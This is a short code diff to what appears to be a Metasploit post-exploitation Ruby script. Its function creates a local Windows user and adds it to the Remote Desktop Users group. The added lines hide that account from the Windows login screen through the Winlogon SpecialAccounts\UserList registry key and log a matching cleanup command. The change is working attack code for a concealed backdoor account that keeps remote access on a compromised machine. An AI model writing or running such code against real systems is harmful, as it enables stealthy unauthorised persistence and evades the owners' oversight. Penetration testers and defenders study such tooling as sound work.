@@ -93,6 +93,10 @@ def addrdpusr(session, username, password)
 	begin
 		cmd_exec("net user #{username} #{password} /add")
 		file_local_write(@dest,"execute -H -f cmd.exe -a \"/c net user #{username} /delete\"")
+		print_status "\tHiding user from Windows Login screen"
+		hide_user_key = 'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList'
+		registry_setvaldata(hide_user_key,username,0,"REG_DWORD")
+		file_local_write(@dest,"reg deleteval -k HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\ NT\\\\CurrentVersion\\\\Winlogon\\\\SpecialAccounts\\\\UserList -v #{username}")
 		print_status "\tAdding User: #{username} to local group '#{rdu}'"
 		cmd_exec("net localgroup \"#{rdu}\" #{username} /add")
 		
